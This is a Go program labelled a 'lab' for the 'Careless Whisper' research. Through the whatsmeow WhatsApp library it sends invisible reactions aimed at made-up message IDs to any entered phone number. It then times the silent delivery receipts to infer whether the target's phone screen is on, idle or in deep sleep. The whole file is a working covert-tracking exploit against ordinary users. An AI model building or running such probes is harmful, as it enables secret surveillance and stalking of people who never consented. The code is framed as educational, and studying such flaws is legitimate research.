package main

import (
    "bufio"
    "context"
    "crypto/rand"
    "encoding/hex"
    "fmt"
    "os"
    "os/signal"
    "path/filepath"
    "strings"
    "sync"
    "syscall"
    "time"

    "go.mau.fi/whatsmeow"
    waCommon "go.mau.fi/whatsmeow/proto/waCommon"
    waE2E "go.mau.fi/whatsmeow/proto/waE2E"
    "go.mau.fi/whatsmeow/store/sqlstore"
    "go.mau.fi/whatsmeow/types"
    "go.mau.fi/whatsmeow/types/events"
    waLog "go.mau.fi/whatsmeow/util/log"
    "google.golang.org/protobuf/proto"
    _ "modernc.org/sqlite" // Pure-Go SQLite driver (No CGO required)
)

// pendingProbe tracks outgoing silent reaction probes to calculate exact RTT.
type pendingProbe struct {
    targetJID types.JID
    sentAt    time.Time
    serverAck time.Time
    delivered time.Time
}

var (
    probesLock sync.Mutex
    probes     = make(map[types.MessageID]*pendingProbe)
)

// generateFakeMessageID generates a synthetic message ID that NEVER existed in chat history.
func generateFakeMessageID() string {
    bytes := make([]byte, 10)
    _, err := rand.Read(bytes)
    if err != nil {
        return fmt.Sprintf("3FEB%d", time.Now().UnixNano())
    }
    return "3FEB" + hex.EncodeToString(bytes)
}

func logReceiptAnalysis(receipt *events.Receipt) {
    fmt.Printf("\n----------------------------------------------------------\n")
    fmt.Printf(" [⚡ RECEIPT EVENT DETECTED]\n")
    fmt.Printf(" Type: %s\n", receipt.Type)
    fmt.Printf(" Source: %s\n", receipt.SourceString())
    fmt.Printf(" Timestamp: %s\n", receipt.Timestamp.Format("15:04:05.000"))
    fmt.Printf(" Acknowledged MsgIDs: %v\n", receipt.MessageIDs)

    probesLock.Lock()
    defer probesLock.Unlock()

    for _, msgID := range receipt.MessageIDs {
        if probe, found := probes[msgID]; found {
            now := time.Now()
            rtt := now.Sub(probe.sentAt)

            // Device delivery receipts are type "" (empty string) in WhatsApp multi-device.
            if string(receipt.Type) == "" || receipt.Type == types.ReceiptTypeDelivered {
                probe.delivered = now
                fmt.Printf("\n 🎯 [SILENT PROBE MATCH] Target Device Acknowledged Delivery!\n")
                fmt.Printf(" Fake Msg ID: %s\n", msgID)
                fmt.Printf(" Target JID: %s\n", probe.targetJID.String())
                fmt.Printf(" Sent At: %s\n", probe.sentAt.Format("15:04:05.000"))
                fmt.Printf(" Delivered: %s\n", now.Format("15:04:05.000"))
                fmt.Printf(" ⏱️ Measured Device RTT: %v (%d ms)\n", rtt.Round(time.Millisecond), rtt.Milliseconds())

                // Educational commentary from arXiv:2411.11194
                fmt.Printf("\n 📖 [Careless Whisper Insight]\n")
                if rtt < 400*time.Millisecond {
                    fmt.Printf(" → RTT < 400ms: Device actively connected (screen ON or recent activity).\n")
                } else if rtt < 1200*time.Millisecond {
                    fmt.Printf(" → RTT 400-1200ms: Standard network latency or light background state.\n")
                } else {
                    fmt.Printf(" → RTT > 1200ms: Phone waking from deep sleep / cellular paging (Doze state).\n")
                }
            }
        }
    }
    fmt.Printf("----------------------------------------------------------\n")
}

func main() {
    fmt.Println("==========================================================")
    fmt.Println(" silent-receipts-lab: Silent Reaction Timing Lab ")
    fmt.Println(" Exploring 'Careless Whisper' (arXiv:2411.11194) ")
    fmt.Println("==========================================================")

    storeDir := "store"
    dbPath := filepath.Join(storeDir, "session.db")

    if _, err := os.Stat(dbPath); os.IsNotExist(err) {
        fmt.Fprintf(os.Stderr, "\n[!] No session database found at '%s'.\n", dbPath)
        fmt.Fprintf(os.Stderr, " Please first run: go run ./cmd/minimal\n")
        os.Exit(1)
    }

    ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
    defer stop()

    dbURI := fmt.Sprintf("file:%s?_pragma=foreign_keys(1)&_pragma=busy_timeout(10000)&_pragma=journal_mode(WAL)", dbPath)
    dbLog := waLog.Stdout("DB", "WARN", true)
    container, err := sqlstore.New(ctx, "sqlite", dbURI, dbLog)
    if err != nil {
        fmt.Fprintf(os.Stderr, "Failed to open session database: %v\n", err)
        os.Exit(1)
    }
    defer container.Close()

    deviceStore, err := container.GetFirstDevice(ctx)
    if err != nil || deviceStore.ID == nil {
        fmt.Fprintf(os.Stderr, "No logged-in device found in database. Run ./cmd/minimal first.\n")
        os.Exit(1)
    }

    clientLog := waLog.Stdout("WA-Lab", "WARN", true)
    client := whatsmeow.NewClient(deviceStore, clientLog)

    client.AddEventHandler(func(evt any) {
        switch v := evt.(type) {
        case *events.Receipt:
            logReceiptAnalysis(v)
        case *events.Connected:
            fmt.Printf("\n[🟢 READY] Connected as %s\n", client.Store.ID.User)
        }
    })

    err = client.Connect()
    if err != nil {
        fmt.Fprintf(os.Stderr, "Failed to connect: %v\n", err)
        os.Exit(1)
    }
    defer client.Disconnect()

    time.Sleep(1 * time.Second)

    scanner := bufio.NewScanner(os.Stdin)
    for {
        fmt.Println("\nSelect an option:")
        fmt.Println(" 1. Passive Receipt Monitor")
        fmt.Println(" 2. Send SILENT Reaction Probe (Phantom ID)")
        fmt.Println(" 3. Exit")
        fmt.Print("lab> ")

        if !scanner.Scan() {
            break
        }
        choice := strings.TrimSpace(scanner.Text())

        switch choice {
        case "1":
            fmt.Println("\n[📡 Passive Monitoring Active] Waiting for incoming receipt frames...")
            fmt.Println("Press Ctrl+C to return to main prompt.")
        case "2":
            fmt.Println("\n-- Send Silent Reaction Probe --")
            fmt.Print("Enter recipient phone number with country code (e.g. 4915756941992): ")
            if !scanner.Scan() {
                break
            }
            phone := strings.TrimSpace(scanner.Text())
            phone = strings.TrimPrefix(phone, "+")
            if phone == "" {
                fmt.Println("Canceled.")
                continue
            }

            targetJID := types.NewJID(phone, types.DefaultUserServer)

            // 1. Generate fake non-existent Message ID
            fakeMsgID := generateFakeMessageID()

            // 2. Build reaction message targeting the fake ID
            msg := &waE2E.Message{
                ReactionMessage: &waE2E.ReactionMessage{
                    Key: &waCommon.MessageKey{
                        RemoteJID: proto.String(targetJID.String()),
                        FromMe:    proto.Bool(false),
                        ID:        proto.String(fakeMsgID), // <--- Non-existent ID
                    },
                    Text:              proto.String("👍"),
                    SenderTimestampMS: proto.Int64(time.Now().UnixMilli()),
                },
            }

            sendStart := time.Now()
            resp, err := client.SendMessage(ctx, targetJID, msg)
            if err != nil {
                fmt.Fprintf(os.Stderr, "Error sending silent probe: %v\n", err)
                continue
            }

            serverAckLatency := time.Since(sendStart)

            probesLock.Lock()
            probes[types.MessageID(fakeMsgID)] = &pendingProbe{
                targetJID: targetJID,
                sentAt:    sendStart,
                serverAck: time.Now(),
            }
            probesLock.Unlock()

            fmt.Printf("\n[📤 SILENT PROBE DISPATCHED]\n")
            fmt.Printf(" Target: %s\n", targetJID.String())
            fmt.Printf(" Fake Msg ID: %s\n", fakeMsgID)
            fmt.Printf(" Server Ack ID: %s\n", resp.ID)
            fmt.Printf(" Server Ack RTT: %v (%d ms)\n", serverAckLatency.Round(time.Millisecond), serverAckLatency.Milliseconds())
            fmt.Printf(" Waiting for silent device delivery receipt...\n\n")

        case "3", "exit", "quit":
            fmt.Println("Exiting lab.")
            return
        }
    }
}
